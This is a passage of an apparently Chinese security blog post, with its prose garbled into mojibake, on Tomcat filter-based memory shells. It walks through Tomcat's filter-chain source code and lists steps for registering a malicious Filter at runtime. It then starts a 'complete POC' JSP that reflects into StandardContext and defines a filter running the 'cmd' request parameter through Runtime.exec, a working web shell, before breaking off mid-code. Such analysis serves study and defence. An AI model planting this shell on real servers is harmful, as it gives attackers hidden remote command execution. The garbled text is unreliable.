class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>ApplicationFilterChain#internalDoFilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++];<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> filterConfig.getFilter(); <span class="hljs-comment">//è·å–Filter</span><br> <br>                <span class="hljs-keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(<br>                        filterConfig.getFilterDef().getAsyncSupported())) &#123;<br>                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);<br>                &#125;<br>                <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>                    <span class="hljs-type">Principal</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span><br>                        ((HttpServletRequest) req).getUserPrincipal();<br> <br>                    Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;req, res, <span class="hljs-built_in">this</span>&#125;;<br>                    SecurityUtil.doAsPrivilege (<span class="hljs-string">&quot;doFilter&quot;</span>, filter, classType, args, principal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    filter.doFilter(request, response, <span class="hljs-built_in">this</span>);<span class="hljs-comment">//* doFilterçš„è°ƒç”¨</span><br>                &#125;<br>            &#125; <br>...<br>    &#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹è·å–Filterçš„æœºåˆ¶ï¼Œ<code>filterConfig</code>æ˜¯<code>filters</code>æ•°ç»„æˆå‘˜ï¼Œä¸€ä¸ª<code>ApplicationFilterConfig</code>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> ApplicationFilterConfig[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-number">0</span>];<br><span class="hljs-comment">//...</span><br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++]<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹<code>filters</code>æ•°ç»„çš„èµ‹å€¼æ—¶æœº,åœ¨<code>StandardWrapperValve#invoke()</code>æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>  <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">// Create the filter chain for this request</span><br>  <span class="hljs-type">ApplicationFilterChain</span> <span class="hljs-variable">filterChain</span> <span class="hljs-operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>createFilterChain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">            Wrapper wrapper, Servlet servlet)</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>(); <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªç©ºçš„filterChain</span><br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br> <br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<span class="hljs-comment">//å¾—åˆ°StandardContext</span><br>        FilterMap filterMaps[] = context.findFilterMaps();<span class="hljs-comment">//è·å–å…¶ä¸­çš„FilterMaps,é‡Œé¢å­˜å‚¨é‡Œå„Filterçš„ä¿¡æ¯</span><br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<span class="hljs-comment">//è·å–åç§°</span><br> <br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123; <span class="hljs-comment">//éå†å¾—åˆ°å¯¹åº”FilterConfig</span><br>            <span class="hljs-comment">//...</span><br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>                    context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-comment">//...</span><br>            filterChain.addFilter(filterConfig);<br>        &#125;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> filterChain;<span class="hljs-comment">//å°†è·å–åˆ°çš„ApplicationFilterConfigæ•´åˆè¿”å›</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>ApplicationFilterChain#addFilter</code>çœ‹ä¸€ä¸‹æ·»åŠ æœºåˆ¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br>        <span class="hljs-comment">//é˜²æ­¢é‡å¤æ·»åŠ </span><br>        <span class="hljs-keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;<br>            <span class="hljs-keyword">if</span>(filter==filterConfig) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (n == filters.length) &#123;<br>            ApplicationFilterConfig[] newFilters =<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[n + INCREMENT];<br>            System.arraycopy(filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, n);<br>            filters = newFilters;<br>        &#125;<br>        filters[n++] = filterConfig;<br> <br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="FilteråŠ¨æ€æ³¨å†Œ"><a href="#FilteråŠ¨æ€æ³¨å†Œ" class="headerlink" title="FilteråŠ¨æ€æ³¨å†Œ"></a>FilteråŠ¨æ€æ³¨å†Œ</h4><p>é€šè¿‡ä¸Šè¿°æµç¨‹å¯ä»¥çŸ¥é“ï¼Œæ¯æ¬¡è¯·æ±‚çš„ FilterChain æ˜¯åŠ¨æ€åŒ¹é…è·å–å’Œç”Ÿæˆçš„ï¼Œå¦‚æœæƒ³æ·»åŠ ä¸€ä¸ª Filter ï¼Œéœ€è¦åœ¨ StandardContext ä¸­ filterMaps ä¸­æ·»åŠ  FilterMapï¼Œåœ¨ filterConfigs ä¸­æ·»åŠ  ApplicationFilterConfigã€‚è¿™æ ·ç¨‹åºåˆ›å»ºæ—¶å°±å¯ä»¥æ‰¾åˆ°æ·»åŠ çš„ Filter äº†ã€‚</p><p>è¿™é‡Œå…ˆè¯´ä¸€ä¸ªå‰ææ¡ä»¶ï¼ŒFilter é…ç½®åœ¨é…ç½®æ–‡ä»¶å’Œæ³¨è§£ä¸­ï¼Œåœ¨å…¶ä»–ä»£ç ä¸­å¦‚æœæƒ³è¦å®Œæˆæ³¨å†Œï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><ol><li>ä½¿ç”¨ ServletContext çš„ addFilter&#x2F;createFilter æ–¹æ³•æ³¨å†Œï¼›</li><li>ä½¿ç”¨ ServletContextListener çš„ contextInitialized æ–¹æ³•åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶æ³¨å†Œï¼›</li><li>ä½¿ç”¨ ServletContainerInitializer çš„ onStartup æ–¹æ³•åœ¨åˆå§‹åŒ–æ—¶æ³¨å†Œï¼ˆéåŠ¨æ€ï¼‰ã€‚</li></ol><p>è¿™é‡Œåªè®¨è®ºç¬¬ä¸€ç§ï¼Œå¹¶å…ˆå…³æ³¨æ¯”è¾ƒé‡è¦çš„addFilteræ–¹æ³•</p><p>åœ¨<code>ServletContext</code>æ¥å£ä¸­æœ‰å£°æ˜äº†3ä¸ª<code>addFilter</code>æ–¹æ³•ï¼Œå…¶å®ç°åœ¨ <code>org.apache.catalina.core.ApplicationContext#addFilter</code> ä¸­ã€‚è¿™é‡Œä»¥Tomcat 10.0.23ä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName,</span><br><span class="hljs-params">        String filterClass, Filter filter)</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br>    <span class="hljs-keyword">if</span> (filterName == <span class="hljs-literal">null</span> || filterName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<span class="hljs-comment">//filterNameä¸èƒ½ä¸ºç©º</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(sm.getString(<br>                <span class="hljs-string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));<br>    &#125;<br>  <span class="hljs-comment">//è¿™é‡Œçš„contextæ˜¯StandardContextç±»å‹</span><br>    <span class="hljs-keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<span class="hljs-comment">//åˆ¤æ–­contextçš„stateæ˜¯å¦æ˜¯ç¨‹åºåˆšå¯åŠ¨çš„state</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                sm.getString(<span class="hljs-string">&quot;applicationContext.addFilter.ise&quot;</span>,<br>                        getContextPath()));<br>    &#125;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> context.findFilterDef(filterName);<span class="hljs-comment">//åœ¨contextä¸­æ ¹æ® filterName å¯»æ‰¾FilterDefå¯¹è±¡</span><br>    <span class="hljs-keyword">if</span> (filterDef == <span class="hljs-literal">null</span>) &#123;<br>        filterDef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilterName(filterName);<br>        context.addFilterDef(filterDef);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (filterDef.getFilterName() != <span class="hljs-literal">null</span> &amp;&amp;<br>                filterDef.getFilterClass() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//å°†Filterå¯¹è±¡æ”¾å…¥FilterDefä¸­</span><br>    <span class="hljs-keyword">if</span> (filter == <span class="hljs-literal">null</span>) &#123;<br>        filterDef.setFilterClass(filterClass);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        filterDef.setFilter(filter);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterRegistration</span>(filterDef, context);<span class="hljs-comment">//åŒ…è£…FilterDefå’Œcontextè¿”å›</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä»ä¼ å‚å¯ä»¥çœ‹å‡ºfilterDefå¿…è¦çš„å±æ€§ä¸º<code>filter</code>ã€<code>filterClass</code>ä»¥åŠ<code>filterName</code>,åŠ¨è°ƒä¸€ä¸‹ä¼šå‘ç°å…¶å®filterClassã€filterNameå¯¹åº”çš„å…¶å®å°±æ˜¯web.xmlä¸­çš„<code>&lt;filter&gt;</code>æ ‡ç­¾ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;filter-class&gt;&lt;/filter-class&gt;<br>&lt;/filter&gt;<br></code></pre></td></tr></table></figure><blockquote><p>å¹¶ä¸”å¯ä»¥å‘ç°<code>ApplicationContext </code>çš„ <code>addFilter</code> ä¸­å°† filter åˆå§‹åŒ–å­˜åœ¨äº† <code>StandardContext</code> çš„ <code>filterDefs</code> ä¸­,ä½†æˆ‘ä»¬ä¹‹å‰åˆ†æçš„<code>FilterChain</code>ä¸­çš„Filteræ˜¯åœ¨<code>StandardContext</code>çš„<code>filterMaps</code>é‡Œè·å–</p><p>è¿™é‡Œå¯ä»¥è·Ÿè¿›çœ‹ä¸€ä¸‹Filteræ˜¯æ€ä¹ˆè¢«æ·»åŠ åˆ°å…¶ä»–å‚æ•°ä¸­çš„</p></blockquote><p>åœ¨ <code>StandardContext</code> çš„ <code>filterStart</code> æ–¹æ³•ä¸­ç”Ÿæˆäº† <code>filterConfigs</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">filterStart</span><span class="hljs-params">()</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>            getLogger().debug(<span class="hljs-string">&quot;Starting filters&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// Instantiate and record a FilterConfig for each defined filter</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">ok</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> (filterConfigs) &#123;<br>            filterConfigs.clear();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;<span class="hljs-comment">//éå†filterDefs</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> entry.getKey();<br>                <span class="hljs-keyword">if</span> (getLogger().isDebugEnabled()) &#123;<br>                    getLogger().debug(<span class="hljs-string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//åˆ›å»ºApplicationFilterConfigå¯¹è±¡å¹¶å­˜å…¥filterConfigsä¸­</span><br>                    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>(<span class="hljs-built_in">this</span>, entry.getValue());<br>                    filterConfigs.put(name, filterConfig);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    t = ExceptionUtils.unwrapInvocationTargetException(t);<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.filterStart&quot;</span>, name), t);<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ok;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>å®Œæˆ<code>filterDefs</code>â€“&gt;<code>filterConfigs</code></p></blockquote><p>åœ¨ ApplicationFilterRegistration çš„ <code>addMappingForUrlPatterns</code> ä¸­ç”Ÿæˆäº† <code>filterMaps</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addMappingForUrlPatterns</span><span class="hljs-params">(</span><br><span class="hljs-params">            EnumSet&lt;DispatcherType&gt; dispatcherTypes, <span class="hljs-type">boolean</span> isMatchAfter,</span><br><span class="hljs-params">            String... urlPatterns)</span> &#123;<br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.setFilterName(filterDef.getFilterName());<span class="hljs-comment">//ä»filterDefè·å–</span><br>        <span class="hljs-keyword">if</span> (dispatcherTypes != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (DispatcherType dispatcherType : dispatcherTypes) &#123;<br>                filterMap.setDispatcher(dispatcherType.name());<span class="hljs-comment">//ç»™dispatcherMappingå±æ€§èµ‹å€¼</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (urlPatterns != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String urlPattern : urlPatterns) &#123;<br>                filterMap.addURLPattern(urlPattern);<span class="hljs-comment">//ç»™urlPatternså±æ€§èµ‹å€¼</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (isMatchAfter) &#123;<br>                context.addFilterMap(filterMap);<span class="hljs-comment">//æ•´åˆfilterMap</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                context.addFilterMapBefore(filterMap);<span class="hljs-comment">//æ•´åˆfilterMap</span><br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>fileMapä»filterDefä¸­è·å–äº†<code>FilterName</code>å±æ€§ï¼Œåç»­åˆèµ‹å€¼äº†<code>urlPatterns</code>,<code>dispatcherMapping</code></p><blockquote><p>å¯ä»¥çœ‹åˆ°<code>filterMaps</code>çš„ç»„æˆéƒ¨åˆ†<code>filterMap</code>çš„ä¿¡æ¯æ˜¯ä»filterDefä¸­è·å–</p></blockquote><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºåŠ¨æ€æ·»åŠ æ¶æ„Filterçš„æ€è·¯</p><ol><li>è·å–StandardContextå¯¹è±¡</li><li>åˆ›å»ºæ¶æ„Filter</li><li>ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§</li><li>åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­</li><li>ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­</li></ol><h4 id="å®Œæ•´POC-1"><a href="#å®Œæ•´POC-1" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><p>Filter.jsp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br> <br>&lt;%<span class="hljs-comment">//è·å–StandardContextå¯¹è±¡</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br> <span class="hljs-comment">//æ¶æ„Filterï¼Œä¸»è¦æ˜¯doFilteræ–¹æ³•</span><br>&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//ä½¿ç”¨FilterDefå°è£…filter</span><br>    <span class="hljs-type">Shell_Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Filter</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span 